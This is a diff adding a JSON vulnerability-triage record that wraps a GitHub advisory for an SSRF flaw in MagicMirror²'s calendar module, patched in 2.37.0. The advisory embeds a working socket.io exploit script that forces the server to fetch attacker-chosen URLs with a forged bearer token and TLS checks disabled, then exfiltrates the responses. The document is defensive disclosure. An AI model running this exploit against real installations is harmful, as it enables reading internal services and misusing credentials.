@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/91026689?v=4\", \"events_url\": \"https://api.github.com/users/gabrie0x6c/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/gabrie0x6c/followers\", \"following_url\": \"https://api.github.com/users/gabrie0x6c/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/gabrie0x6c/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/gabrie0x6c\", \"id\": 91026689, \"login\": \"gabrie0x6c\", \"node_id\": \"MDQ6VXNlcjkxMDI2Njg5\", \"organizations_url\": \"https://api.github.com/users/gabrie0x6c/orgs\", \"received_events_url\": \"https://api.github.com/users/gabrie0x6c/received_events\", \"repos_url\": \"https://api.github.com/users/gabrie0x6c/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/gabrie0x6c/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/gabrie0x6c/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/gabrie0x6c\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-63643\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-441\", \"name\": \"Unintended Proxy or Intermediary ('Confused Deputy')\"}, {\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"# Vulnerability — SSRF via `ADD_CALENDAR` (MagicMirror² calendar)\\n\\n> Analysis of the PoC `exploit-ssrf-calendar.js`.\\n> Target: `calendar/node_helper.js` of MagicMirror², socket.io namespace `/calendar`.\\n\\n---\\n\\n## Identification\\n\\n| Field | Value |\\n|-------|-------|\\n| **PoC file** | `exploit-ssrf-calendar.js` |\\n| **Endpoint** | socket.io namespace `/calendar`, notification `ADD_CALENDAR` |\\n| **Precondition** | reach the mirror's HTTP port (no authentication required) |\\n\\n---\\n\\n## Description\\n\\nThe `ADD_CALENDAR` handler in `calendar/node_helper.js` performs a **server-side** HTTP request to a URL that is **fully attacker-controlled**, with no SSRF protection whatsoever — unlike the project's hardened `/cors` endpoint.\\n\\nWorse, the attacker also controls:\\n- the **authentication headers** the server attaches to the request (`auth: { method: \\\"bearer\\\", pass: \\\"...\\\" }`);\\n- the `selfSignedCert` flag, which **disables TLS verification** of the server-side request.\\n\\nWhen the target's response is **valid iCal**, the server parses the events and sends them back to the attacker via `CALENDAR_EVENTS` — turning the SSRF into **full data exfiltration** (response body read). Against non-iCal responses it remains a blind SSRF (the attacker still forces the server-side request, they just don't see the body).\\n\\n---\\n\\n## Root cause: unauthenticated socket.io channel + permissive CORS\\n\\nThe socket.io server accepts connections from **any origin** and with **no authentication**:\\n\\n```js\\nconst io = new Server(server, {\\n  cors: { origin: /.*$/, credentials: true }\\n});\\n```\\n\\nThe `/calendar` namespace registers the handler without checking who is connected (**CWE-306**). Any process or browser tab that can reach the mirror's port can emit the notification.\\n\\n---\\n\\n## Exploit (`exploit-ssrf-calendar.js`)\\n\\n```js\\nconst { io } = require(\\\"socket.io-client\\\");\\n\\nconst TARGET = process.env.MM || \\\"http://TARGET:8888\\\";\\nconst INTERNAL_URL = process.argv[2] || process.env.SSRF_URL || \\\"https://webhook.site/\\\";\\n\\nconst socket = io(`${TARGET}/calendar`, { path: \\\"/socket.io\\\", transports: [\\\"websocket\\\", \\\"polling\\\"] });\\n\\nsocket.onAny((event, payload) => {\\n\\tif (event === \\\"CALENDAR_EVENTS\\\") {\\n\\t\\tconsole.log(\\\"\\\\n[+] CALENDAR_EVENTS received from server (SSRF response exfiltrated):\\\");\\n\\t\\tfor (const ev of payload.events || []) {\\n\\t\\t\\tconsole.log(\\\"    SUMMARY:\\\", ev.title);\\n\\t\\t\\tif (ev.title && ev.title.includes(\\\"FLAG{\\\")) {\\n\\t\\t\\t\\tconsole.log(\\\"\\\\n[!!!] SSRF SUCCESS - leaked secret from internal-only service:\\\");\\n\\t\\t\\t\\tconsole.log(\\\"      \\\" + ev.title);\\n\\t\\t\\t\\tprocess.exit(0);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t} else if (event === \\\"CALENDAR_ERROR\\\") {\\n\\t\\tconsole.log(\\\"[-] CALENDAR_ERROR:\\\", JSON.stringify(payload));\\n\\t}\\n});\\n\\nsocket.on(\\\"connect\\\", () => {\\n\\tconsole.log(`[*] Connected to ${TARGET}/calendar (no auth required). socket id=${socket.id}`);\\n\\tconsole.log(`[*] Forcing server-side fetch of internal target: ${INTERNAL_URL}`);\\n\\tsocket.emit(\\\"ADD_CALENDAR\\\", {\\n\\t\\turl: INTERNAL_URL,\\n\\t\\tfetchInterval: 60000,\\n\\t\\texcludedEvents: [],\\n\\t\\tmaximumEntries: 10,\\n\\t\\tmaximumNumberOfDays: 3650,\\n\\t\\tauth: { method: \\\"bearer\\\", pass: \\\"internal-admin-token\\\" },\\n\\t\\tbroadcastPastEvents: true,\\n\\t\\tselfSignedCert: true,\\n\\t\\tid: \\\"pwn\\\"\\n\\t});\\n});\\n\\nsocket.on(\\\"connect_error\\\", (e) => console.log(\\\"[-] connect_error:\\\", e.message));\\n\\nsetTimeout(() => { console.log(\\\"\\\\n[*] timeout, exiting\\\"); process.exit(1); }, 20000);\\n```\\n\\n---\\n\\n## Vulnerable target code (pattern)\\n\\n```js\\nsocketNotificationReceived(notification, payload) {\\n  if (notification === \\\"ADD_CALENDAR\\\") {\\n    const fetcher = new CalendarFetcher(\\n      payload.url,\\n      payload.fetchInterval,\\n      payload.excludedEvents,\\n      payload.maximumEntries,\\n      payload.maximumNumberOfDays,\\n      payload.auth,\\n      payload.broadcastPastEvents,\\n      payload.selfSignedCert\\n    );\\n    fetcher.fetchCalendar();\\n  }\\n}\\n```\\n\\n---\\n\\n## Impact\\n\\n- **Reading internal services** unreachable from the attacker's network (cloud metadata `169.254.169.254`, admin panels on `127.0.0.1`, services on the private network).\\n- **Body exfiltration** when the response is iCal (the PoC searches for `FLAG{...}` in event titles).\\n- **Confused deputy / credential injection**: the server attaches an attacker-controlled `Authorization: Bearer ...` header, allowing it to forge/replay credentials against the internal target.\\n- **TLS bypass** via `selfSignedCert: true`.\\n- Internal port scanning through error/timing differences.\\n\\n---\", \"ghsa_id\": \"GHSA-w6x9-28jw-hq7j\", \"github_reviewed_at\": \"2026-08-18T17:26:51Z\", \"html_url\": \"https://github.com/advisories/GHSA-w6x9-28jw-hq7j\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w6x9-28jw-hq7j\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-63643\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-18T17:26:51Z\", \"references\": [\"https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w6x9-28jw-hq7j\", \"https://github.com/MagicMirrorOrg/MagicMirror/pull/4169\", \"https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f\", \"https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0\", \"https://github.com/advisories/GHSA-w6x9-28jw-hq7j\"], \"repository_advisory_url\": \"https://api.github.com/repos/MagicMirrorOrg/MagicMirror/security-advisories/GHSA-w6x9-28jw-hq7j\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/MagicMirrorOrg/MagicMirror\", \"summary\": \"MagicMirror: ssrf calendar .js\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-18T17:26:53Z\", \"url\": \"https://api.github.com/advisories/GHSA-w6x9-28jw-hq7j\", \"vulnerabilities\": [{\"first_patched_version\": \"2.37.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"magicmirror\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.37.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w6x9-28jw-hq7j",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "magicmirror: < 2.37.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-63643"
+    ],
+    "cvss_score": 6.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "magicmirror"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-18T19:18:49.954097Z",
+  "provenance": {
+    "content_sha256": "9a59d68335bb76cd0f6f0f5b489322a3d26a370b0f54ac78fa1a01dc00a4bb00",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-18T17:26:51Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w6x9-28jw-hq7j",
+  "status": "active",
+  "title": "MagicMirror: ssrf calendar .js",
+  "updated_at": "2026-08-18T17:26:53Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w6x9-28jw-hq7j"
+}
